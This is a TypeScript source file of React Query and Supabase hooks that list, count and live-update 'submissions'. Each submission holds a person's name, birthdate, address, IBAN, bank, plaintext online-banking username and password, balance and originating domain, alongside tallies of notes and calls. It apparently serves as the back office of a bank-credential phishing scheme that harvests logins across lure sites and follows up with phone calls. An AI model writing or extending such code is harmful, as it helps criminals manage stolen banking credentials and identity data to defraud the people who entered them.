import { useEffect } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";

export interface Submission {
  id: string;
  session_id: string;
  created_at: string;
  full_name: string | null;
  email: string | null;
  birthdate: string | null;
  phone: string | null;
  street: string | null;
  house_number: string | null;
  staircase: string | null;
  door_number: string | null;
  postal_code: string | null;
  city: string | null;
  iban: string | null;
  bank: string | null;
  bank_username: string | null;
  bank_password: string | null;
  bank_username_label: string | null;
  bank_password_label: string | null;
  bank_extra: Record<string, string> | null;
  balance: string | null;
  status: string | null;
  domain: string | null;
}

export interface Note {
  id: string;
  user_email: string;
  content: string;
  created_at: string;
}

async function fetchSubmissions(): Promise<Submission[]> {
  const PAGE = 1000;
  const all: Submission[] = [];
  let from = 0;
  while (true) {
    const { data, error } = await supabase
      .from("submissions")
      .select("*")
      .order("created_at", { ascending: false })
      .range(from, from + PAGE - 1);
    if (error) throw error;
    if (!data || data.length === 0) break;
    all.push(...(data as Submission[]));
    if (data.length < PAGE) break;
    from += PAGE;
  }
  return all;
}

async function fetchCounts(table: "submission_notes" | "submission_calls") {
  const PAGE = 1000;
  const counts: Record<string, number> = {};
  let from = 0;
  while (true) {
    const { data, error } = await supabase
      .from(table)
      .select("id, submission_id")
      .range(from, from + PAGE - 1);
    if (error) throw error;
    if (!data || data.length === 0) break;
    data.forEach((row: any) => {
      counts[row.submission_id] = (counts[row.submission_id] || 0) + 1;
    });
    if (data.length < PAGE) break;
    from += PAGE;
  }
  return counts;
}

export function useSubmissions() {
  const queryClient = useQueryClient();

  const { data: submissions = [], isLoading } = useQuery({
    queryKey: ["submissions"],
    queryFn: fetchSubmissions,
    staleTime: 30_000,
  });

  const { data: noteCounts = {} } = useQuery({
    queryKey: ["submission-note-counts"],
    queryFn: () => fetchCounts("submission_notes"),
    staleTime: 30_000,
  });

  const { data: callCounts = {} } = useQuery({
    queryKey: ["submission-call-counts"],
    queryFn: () => fetchCounts("submission_calls"),
    staleTime: 30_000,
  });

  useEffect(() => {
    const channel = supabase
      .channel("submissions-realtime")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "submissions" },
        () => {
          queryClient.invalidateQueries({ queryKey: ["submissions"] });
        }
      )
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "submissions" },
        () => {
          queryClient.invalidateQueries({ queryKey: ["submissions"] });
        }
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "submissions" },
        () => {
          queryClient.invalidateQueries({ queryKey: ["submissions"] });
        }
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, [queryClient]);

  const refetch = () => {
    queryClient.invalidateQueries({ queryKey: ["submissions"] });
    queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
    queryClient.invalidateQueries({ queryKey: ["submission-call-counts"] });
  };

  return { submissions, noteCounts, callCounts, isLoading, refetch };
}

export function useSubmission(id: string | undefined) {
  const queryClient = useQueryClient();

  const { data: submission, isLoading } = useQuery({
    queryKey: ["submission", id],
    queryFn: async () => {
      if (!id) return null;
      // Try cache first
      const cached = queryClient.getQueryData<Submission[]>(["submissions"]);
      const fromCache = cached?.find((s) => s.id === id);
      if (fromCache) return fromCache;
      const { data, error } = await supabase.from("submissions").select("*").eq("id", id).single();
      if (error) throw error;
      return data as Submission;
    },
    enabled: !!id,
    staleTime: 30_000,
  });

  return { submission: submission ?? null, isLoading };
}
